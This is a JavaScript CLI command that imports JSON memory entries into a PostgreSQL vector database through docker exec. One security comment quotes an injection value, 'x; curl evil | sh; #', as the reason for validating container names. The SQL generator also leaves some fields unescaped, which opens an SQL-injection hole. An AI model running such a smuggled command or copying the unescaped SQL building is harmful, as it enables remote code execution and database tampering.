/**
 * CLI MonoVector Import Command
 * Import data from sql.js/JSON memory to MonoVector PostgreSQL
 *
 * Usage:
 *   npx monomind monovector import --input memory-export.json
 *   npx monomind monovector import --from-memory
 *   npx monomind monovector import --input data.json --batch-size 100
 *
 * https://github.com/monoes/monomind
 */
import { output } from '../../output.js';
import * as fs from 'fs';
import * as path from 'path';
/**
 * Format a monovector embedding array for PostgreSQL
 */
function formatEmbedding(embedding, dimensions = 384) {
    // Ensure correct dimensions by padding or truncating
    const padded = [...embedding];
    while (padded.length < dimensions) {
        padded.push(0);
    }
    if (padded.length > dimensions) {
        padded.length = dimensions;
    }
    return `'[${padded.join(',')}]'::monovector(${dimensions})`;
}
/**
 * Escape string for PostgreSQL
 */
function escapeString(str) {
    return str.replace(/'/g, "''").replace(/\\/g, '\\\\');
}
/**
 * Generate SQL INSERT statement for a memory entry
 */
function generateInsertSQL(entry) {
    const key = escapeString(entry.key);
    const value = typeof entry.value === 'string'
        ? escapeString(entry.value)
        : escapeString(JSON.stringify(entry.value));
    const namespace = entry.namespace || 'default';
    const metadata = entry.metadata ? escapeString(JSON.stringify(entry.metadata)) : '{}';
    let embeddingClause = 'NULL';
    if (entry.embedding && Array.isArray(entry.embedding) && entry.embedding.length > 0) {
        embeddingClause = formatEmbedding(entry.embedding);
    }
    return `INSERT INTO monomind.memory_entries (key, value, embedding, namespace, metadata, created_at, updated_at)
VALUES (
  '${key}',
  '${value}',
  ${embeddingClause},
  '${namespace}',
  '${metadata}'::jsonb,
  ${entry.created_at ? `'${entry.created_at}'::timestamptz` : 'NOW()'},
  ${entry.updated_at ? `'${entry.updated_at}'::timestamptz` : 'NOW()'}
)
ON CONFLICT (key, namespace) DO UPDATE SET
  value = EXCLUDED.value,
  embedding = COALESCE(EXCLUDED.embedding, monomind.memory_entries.embedding),
  metadata = EXCLUDED.metadata,
  updated_at = NOW();`;
}
/**
 * MonoVector Import command - import from sql.js/JSON to PostgreSQL
 */
export const importCommand = {
    name: 'import',
    description: 'Import data from sql.js/JSON memory to MonoVector PostgreSQL',
    aliases: ['load', 'migrate-data'],
    options: [
        {
            name: 'input',
            short: 'i',
            description: 'Input JSON file path',
            type: 'string',
        },
        {
            name: 'from-memory',
            description: 'Export from current Monomind memory and import',
            type: 'boolean',
            default: false,
        },
        {
            name: 'output',
            short: 'o',
            description: 'Output SQL file instead of executing (dry-run)',
            type: 'string',
        },
        {
            name: 'batch-size',
            short: 'b',
            description: 'Batch size for imports',
            type: 'number',
            default: 100,
        },
        {
            name: 'host',
            short: 'h',
            description: 'PostgreSQL host',
            type: 'string',
            default: 'localhost',
        },
        {
            name: 'port',
            short: 'p',
            description: 'PostgreSQL port',
            type: 'number',
            default: 5432,
        },
        {
            name: 'database',
            short: 'd',
            description: 'Database name',
            type: 'string',
            default: 'monomind',
        },
        {
            name: 'user',
            short: 'u',
            description: 'Database user',
            type: 'string',
            default: 'claude',
        },
        {
            name: 'password',
            description: 'Database password (or use PGPASSWORD env var)',
            type: 'string',
        },
        {
            name: 'container',
            short: 'c',
            description: 'Docker container name to exec into',
            type: 'string',
            default: 'monovector-postgres',
        },
        {
            name: 'verbose',
            short: 'v',
            description: 'Verbose output',
            type: 'boolean',
            default: false,
        },
    ],
    examples: [
        { command: 'monomind monovector import --input memory-export.json', description: 'Import from JSON file' },
        { command: 'monomind monovector import --input data.json --output import.sql', description: 'Generate SQL file (dry-run)' },
        { command: 'monomind monovector import --from-memory', description: 'Export current memory and import' },
        { command: 'monomind monovector import --input data.json --container my-postgres', description: 'Import using custom container' },
    ],
    action: async (ctx) => {
        const inputFile = ctx.flags.input;
        const fromMemory = ctx.flags['from-memory'];
        const outputFile = ctx.flags.output;
        const batchSize = ctx.flags['batch-size'] || 100;
        const containerName = ctx.flags.container || 'monovector-postgres';
        // SECURITY: containerName is interpolated into shell commands below.
        // Without validation, --container 'x; curl evil | sh; #' becomes a shell
        // metachar payload. Validate against Docker's documented container-name
        // syntax: ^[a-zA-Z0-9][a-zA-Z0-9_.-]{0,127}$
        if (!/^[a-zA-Z0-9][a-zA-Z0-9_.-]{0,127}$/.test(containerName)) {
            output.printError(`Invalid container name: must match Docker syntax [a-zA-Z0-9][a-zA-Z0-9_.-]{0,127}`);
            return { success: false, message: 'Invalid container name' };
        }
        const verbose = ctx.flags.verbose;
        output.writeln();
        output.writeln(output.bold('MonoVector PostgreSQL Import'));
        output.writeln(output.dim('='.repeat(50)));
        output.writeln();
        // Validate input
        if (!inputFile && !fromMemory) {
            output.printError('Either --input <file> or --from-memory is required');
            output.writeln();
            output.printInfo('Examples:');
            output.writeln('  monomind monovector import --input memory-export.json');
            output.writeln('  monomind monovector import --from-memory');
            return { success: false, message: 'Missing input source' };
        }
        let entries = [];
        // Load entries from JSON file
        if (inputFile) {
            if (!fs.existsSync(inputFile)) {
                output.printError(`Input file not found: ${inputFile}`);
                return { success: false, message: 'File not found' };
            }
            // Symlink guard: a symlink could redirect to /etc/passwd or a huge file.
            // lstatSync checks the link itself, not the target — so symlinks are rejected
            // regardless of what they point to (TOCTOU-safe for the check + read pair).
            const lstat = fs.lstatSync(inputFile);
            if (lstat.isSymbolicLink()) {
                output.printError(`Symlinks are not allowed as input files: ${inputFile}`);
                return { success: false, message: 'Symlink not allowed' };
            }
            // Size guard: without this, a user can pass a multi-GB file and exhaust the
            // Node heap before JSON.parse ever runs, crashing the CLI with an OOM.
            const MAX_IMPORT_FILE_BYTES = 50 * 1024 * 1024; // 50 MB
            if (lstat.size > MAX_IMPORT_FILE_BYTES) {
                output.printError(`Input file too large: ${inputFile} (max 50 MB)`);
                return { success: false, message: 'Input file too large' };
            }
            try {
                output.printInfo(`Reading: ${inputFile}`);
                const content = fs.readFileSync(inputFile, 'utf-8');
                const data = JSON.parse(content);
                // Handle different JSON formats
                if (Array.isArray(data)) {
                    entries = data;
                }
                else if (data.entries && Array.isArray(data.entries)) {
                    entries = data.entries;
                }
                else if (data.results && Array.isArray(data.results)) {
                    entries = data.results;
                }
                else if (typeof data === 'object') {
                    // Convert object format { key: value } to entries
                    entries = Object.entries(data).map(([key, value]) => ({
                        key,
                        value: typeof value === 'object' ? JSON.stringify(value) : String(value),
                    }));
                }
                output.printSuccess(`Loaded ${entries.length} entries from file`);
            }
            catch (error) {
                const errorMessage = error instanceof Error ? error.message : String(error);
                output.printError(`Failed to parse JSON: ${errorMessage}`);
                return { success: false, message: errorMessage };
            }
        }
        // Export from current memory
        if (fromMemory) {
            output.printInfo('Exporting from current Monomind memory...');
            output.printWarning('Note: Run "npx monomind memory list --format json > memory-export.json" first');
            output.printInfo('Then use: npx monomind monovector import --input memory-export.json');
            return { success: false, message: 'Use explicit JSON export first' };
        }
        if (entries.length === 0) {
            output.printWarning('No entries to import');
            return { success: true };
        }
        // Calculate statistics
        const stats = {
            total: entries.length,
            imported: 0,
            skipped: 0,
            errors: 0,
            withEmbeddings: 0,
            byNamespace: {},
        };
        // Generate SQL statements
        const sqlStatements = [];
        sqlStatements.push('-- MonoVector PostgreSQL Import');
        sqlStatements.push(`-- Generated: ${new Date().toISOString()}`);
        sqlStatements.push(`-- Total entries: ${entries.length}`);
        sqlStatements.push('');
        sqlStatements.push('BEGIN;');
        sqlStatements.push('');
        for (const entry of entries) {
            try {
                // Track statistics
                const ns = entry.namespace || 'default';
                stats.byNamespace[ns] = (stats.byNamespace[ns] || 0) + 1;
                if (entry.embedding && entry.embedding.length > 0) {
                    stats.withEmbeddings++;
                }
                const sql = generateInsertSQL(entry);
                sqlStatements.push(sql);
                sqlStatements.push('');
                stats.imported++;
                if (verbose) {
                    output.writeln(output.dim(`  Processed: ${entry.key} (${ns})`));
                }
            }
            catch (error) {
                stats.errors++;
                const errorMessage = error instanceof Error ? error.message : String(error);
                output.printWarning(`Skipped entry "${entry.key}": ${errorMessage}`);
            }
        }
        sqlStatements.push('COMMIT;');
        sqlStatements.push('');
        sqlStatements.push(`-- Import complete: ${stats.imported} entries`);
        const fullSQL = sqlStatements.join('\n');
        // Output SQL file (dry-run)
        if (outputFile) {
            try {
                output.printInfo(`Writing SQL to: ${outputFile}`);
                fs.writeFileSync(outputFile, fullSQL);
                output.printSuccess(`SQL file created: ${outputFile}`);
                output.writeln();
                output.printInfo('To execute the import:');
                output.writeln(`  docker exec -i ${containerName} psql -U claude -d monomind < ${outputFile}`);
            }
            catch (error) {
                const errorMessage = error instanceof Error ? error.message : String(error);
                output.printError(`Failed to write SQL file: ${errorMessage}`);
                return { success: false, message: errorMessage };
            }
        }
        else {
            // Execute directly via docker exec
            output.printInfo(`Importing to PostgreSQL via container: ${containerName}`);
            output.writeln();
            // Write to temp file for execution
            const tempFile = path.join(process.cwd(), '.monovector-import-temp.sql');
            try {
                fs.writeFileSync(tempFile, fullSQL);
                output.printInfo('Executing import...');
                output.writeln();
                output.writeln(output.dim('Command:'));
                output.writeln(output.dim(`  docker exec -i ${containerName} psql -U claude -d monomind < ${tempFile}`));
                output.writeln();
                // Execute via child_process
                const { execFileSync } = await import('child_process');
                try {
                    const sqlContent = fs.readFileSync(tempFile);
                    const result = execFileSync('docker', ['exec', '-i', containerName, 'psql', '-U', 'claude', '-d', 'monomind'], {
                        input: sqlContent,
                        encoding: 'utf-8',
                        timeout: 60000,
                    });
                    if (verbose) {
                        output.writeln(output.dim(result));
                    }
                    output.printSuccess('Import completed successfully!');
                }
                catch (execError) {
                    const execErrorMessage = execError instanceof Error ? execError.message : String(execError);
                    output.printError(`Import failed: ${execErrorMessage}`);
                    output.writeln();
                    output.printInfo('You can manually run the import with:');
                    output.writeln(`  docker exec -i ${containerName} psql -U claude -d monomind < ${tempFile}`);
                    return { success: false, message: execErrorMessage };
                }
                finally {
                    // Clean up temp file
                    try {
                        fs.unlinkSync(tempFile);
                    }
                    catch {
                        // Ignore cleanup errors
                    }
                }
            }
            catch (error) {
                const errorMessage = error instanceof Error ? error.message : String(error);
                output.printError(`Failed to create temp file: ${errorMessage}`);
                return { success: false, message: errorMessage };
            }
        }
        // Print statistics
        output.writeln();
        output.printBox([
            'Import Statistics',
            '',
            `  Total entries:     ${stats.total}`,
            `  Imported:          ${stats.imported}`,
            `  With embeddings:   ${stats.withEmbeddings}`,
            `  Errors:            ${stats.errors}`,
            '',
            'By Namespace:',
            ...Object.entries(stats.byNamespace).map(([ns, count]) => `  ${ns}: ${count}`),
        ].join('\n'), 'Import Complete');
        output.writeln();
        // Show verification command
        output.printInfo('To verify the import:');
        output.writeln(`  docker exec ${containerName} psql -U claude -d monomind -c "SELECT COUNT(*) FROM monomind.memory_entries;"`);
        output.writeln();
        return { success: true };
    },
};
export default importCommand;
//# sourceMappingURL=import.js.map